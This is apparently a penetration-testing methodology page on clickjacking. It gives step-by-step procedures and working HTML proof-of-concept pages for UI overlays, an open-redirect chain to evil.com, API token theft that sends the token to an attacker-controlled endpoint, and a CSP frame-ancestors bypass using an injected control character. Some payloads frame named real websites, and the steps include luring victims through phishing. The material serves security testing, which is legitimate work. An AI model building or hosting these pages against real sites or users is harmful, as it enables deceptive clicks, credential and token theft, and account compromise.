# Clickjacking

## Check List

## Methodology

### Black Box

#### [UI Redress Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking#ui-redressing)

{% stepper %}
{% step %}
Go to your target website
{% endstep %}

{% step %}
generate HTML code to test for Clickjacking vulnerability, and change the src parameter to your target website

```html
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="https://target.com/" height="550px" width="700px"></iframe>
</body>
</html>
```
{% endstep %}

{% step %}
confirm that the HTML file is executed in your browser
{% endstep %}
{% endstepper %}

***

#### Missing X-Frame-Options

{% stepper %}
{% step %}
inspect the HTTP response headers of your target webpages and verify that `X-Frame-Options` is not set to `DENY` or `SAMEORIGIN`
{% endstep %}

{% step %}
Confirm that the target pages can be framed by external sites
{% endstep %}

{% step %}
Create a simple HTML page containing `<iframe>` elements that load the target URLs. The HTML file could look like this

```html
<html>
 <head> 
  <style>
      iframe{
        width:500px;
        height:900px;
      }
      #http{
        height:900px;
        width:500px;
      }
  </style> 
 </head>
 <body> 
  <h1>--------------------This is a malicious website-------------------</h1>
  <h1>The vulnerable website:-</nn></h1>
  <iframe src="https://sifchain.finance/"></iframe>
  <iframe id="http" src="https://dex.sifchain.finance/#/peg"></iframe>
 </body>
</html>
```
{% endstep %}

{% step %}
Open the crafted HTML page in a browser and observe that the target website renders successfully inside the iframe
{% endstep %}
{% endstepper %}

***

#### UI Overlay

{% stepper %}
{% step %}
Identify a webpage that lacks `X-Frame-Options` and `Content-Security-Policy:` frame-ancestors, allowing it to be embedded in an `iframe`
{% endstep %}

{% step %}
Create an HTML page that loads the target website inside an `<iframe>`
{% endstep %}

{% step %}
Apply CSS styling to the `iframe` to lower opacity, hide it, or position it beneath deceptive UI elements
{% endstep %}

{% step %}
Overlay fake buttons, text, or interactive elements on top of the `iframe` to mislead the user
{% endstep %}

{% step %}
final payload might look like this

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the malicious HTML page on any external server controlled by the attacker
{% endstep %}

{% step %}
Trick a victim into visiting the page through phishing, social engineering, or embedded links
{% endstep %}

{% step %}
Observe that user clicks interact with the underlying target website instead of the visible fake UI, confirming clickjacking


{% endstep %}
{% endstepper %}

***

#### Clickjacking To Open Redirect Chain

{% stepper %}
{% step %}
Visit the target login page and check whether the page can be framed (i.e., verify clickjacking potential)
{% endstep %}

{% step %}
Confirm that the site does not provide effective clickjacking protection  no `X-Frame-Options:` `DENY` or similar blocking headers
{% endstep %}

{% step %}
Create a simple HTML page that embeds the vulnerable URL inside an \<iframe>
{% endstep %}

{% step %}
Chain the clickjacking `iframe` with an open redirect on the target site, by directing clicks through the embedded frame to the redirect URL. The code might look like this

```html
<!DOCTYPE html>
<html>
<head>
<style>
iframe{
    width: 100%;
    height: 585px;
    border: none;
}
</style>
<title>Clickjacking</title>
</head>
<body>
<a onmouseover=window.open("https://evil.com") href="https://evil.com" style="z-index:1;left:900px;position:relative;top:150px;font-family: Montserrat;font-weight: 800;font-size:16px;text-transform: uppercase;color:red;text-decoration:none;font-style: normal;">
click here to win the prize </a>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-script"
style="opacity:1"
src="
https://example.com"></iframe>
</body>
</html>
```
{% endstep %}

{% step %}
Host this combined PoC so that when the victim clicks a link (“Click here to win the prize”), it triggers the click on the framed login page and causes the open redirect to execute
{% endstep %}

{% step %}
Observe the victim’s browser redirect to the attacker-controlled URL (via the open redirect), demonstrating the chain
{% endstep %}
{% endstepper %}

***

#### API Token Hijacking Through Clickjacking

{% stepper %}
{% step %}
inspect the HTTP response headers on token-related pages and confirm that the site does not enforce protections such as `X-Frame-Options:` `DENY` or `SAMEORIGIN`, or restrictive \``Content-Security-Policy` containing frame-ancestors
{% endstep %}

{% step %}
Create a test page that frames the target site and overlays custom elements exactly above the button used to reveal or copy the user’s API token
{% endstep %}

{% step %}
In the \<form> section of the testing page, configure a server endpoint you control (such as a Burp Collaborator URL) as the receiver for whatever the victim enters or submits during the interaction
{% endstep %}

{% step %}
Adjust the CSS (using low or zero opacity) so that the victim sees what appears to be the legitimate token-copy interface and is tricked into clicking the overlay, which actually triggers the real “copy token” functionality in the framed page
{% endstep %}

{% step %}
Guide the victim (via text or UI in the overlay) to paste the copied value into a visible input field on the attacker-controlled page, which then sends the submitted token to your controlled endpoint for verification
{% endstep %}
{% endstepper %}

***

#### CSP Bypass Clickjacking

{% stepper %}
{% step %}
Navigate to the vulnerable endpoint that loads account managers page with the origin parameter
{% endstep %}

{% step %}
Inspect the HTTP response headers and confirm that no `X-Frame-Options` header is present, while the page is protected only by a `CSP frame-ancestors` rule
{% endstep %}

{% step %}
Modify the origin parameter and confirm the CSP is reflected

```http
origin=https://example.com
```
{% endstep %}

{% step %}
Test whether subdomain variations are accepted by replacing the origin with another allowed host, such as

```http
origin=https://attacker.example.google.com
```
{% endstep %}

{% step %}
Bypass the CSP by injecting an illegal, URL-encoded control character before the allowed domain

```http
origin=https://attacker.example.google.com
```
{% endstep %}

{% step %}
Confirm that loading the URL with the payload removes the CSP `frame-ancestors` protection and the page becomes `iframe-able`
{% endstep %}

{% step %}
Create a simple HTML file to test clickjacking with the CSP-bypass vector

```html
<html>
<body>
<iframe 
src="https://useraccount.example.com/[vulnerable subdomain]&origin=https://%0d.example.com" 
width="1000" height="1000">
</iframe>
</body>
</html>
```
{% endstep %}

{% step %}
Load the HTML file in the browser and confirm that the account managers page renders inside the `iframe`, demonstrating the clickjacking vulnerability
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
